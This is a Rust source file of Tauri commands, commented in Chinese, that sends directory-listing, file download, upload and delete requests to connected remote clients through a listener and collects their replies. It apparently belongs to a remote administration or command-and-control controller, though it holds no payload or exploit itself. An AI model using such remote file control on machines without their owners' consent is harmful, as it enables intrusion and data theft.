//! 文件管理相关 Tauri 命令

use crate::state::SharedState;
use serde::Serialize;
use shared::messages::{FileDelete, FileDownload, FileUpload, GetDirectoryListing, Message};
use tauri::State;

#[derive(Debug, Serialize)]
pub struct FileEntryInfo {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: u64,
    pub modified: i64,
}

/// 获取目录列表
#[tauri::command]
pub async fn get_directory_listing(
    state: State<'_, SharedState>,
    client_id: String,
    path: String,
) -> Result<(), String> {
    let msg = Message::GetDirectoryListing(GetDirectoryListing { path });
    let data = msg.serialize().map_err(|e| e.to_string())?;
    crate::listener::send_to_client(&state, &client_id, &data);
    Ok(())
}

/// 下载文件
#[tauri::command]
pub async fn download_file(
    state: State<'_, SharedState>,
    client_id: String,
    path: String,
) -> Result<(), String> {
    let msg = Message::FileDownload(FileDownload { path });
    let data = msg.serialize().map_err(|e| e.to_string())?;
    crate::listener::send_to_client(&state, &client_id, &data);
    Ok(())
}

/// 上传文件
#[tauri::command]
pub async fn upload_file(
    state: State<'_, SharedState>,
    #[allow(non_snake_case)]
    clientId: String,
    path: String,
    #[allow(non_snake_case)]
    fileData: Vec<u8>,
) -> Result<(), String> {
    println!("[*] Upload command: {} -> {} ({} bytes)", clientId, path, fileData.len());
    let msg = Message::FileUpload(FileUpload {
        path: path.clone(),
        data: fileData.clone(),
        is_complete: true,
    });
    let data = msg.serialize().map_err(|e| e.to_string())?;
    println!("[*] Serialized upload message: {} bytes", data.len());
    crate::listener::send_to_client(&state, &clientId, &data);
    println!("[*] Upload command sent to client");
    Ok(())
}

/// 删除文件
#[tauri::command]
pub async fn delete_file(
    state: State<'_, SharedState>,
    client_id: String,
    path: String,
) -> Result<(), String> {
    let msg = Message::FileDelete(FileDelete { path });
    let data = msg.serialize().map_err(|e| e.to_string())?;
    crate::listener::send_to_client(&state, &client_id, &data);
    Ok(())
}

/// 获取指定客户端的文件响应
#[tauri::command]
pub fn get_file_responses(
    state: State<SharedState>,
    client_id: String,
) -> Vec<crate::state::FileResponse> {
    state.take_file_responses(&client_id)
}

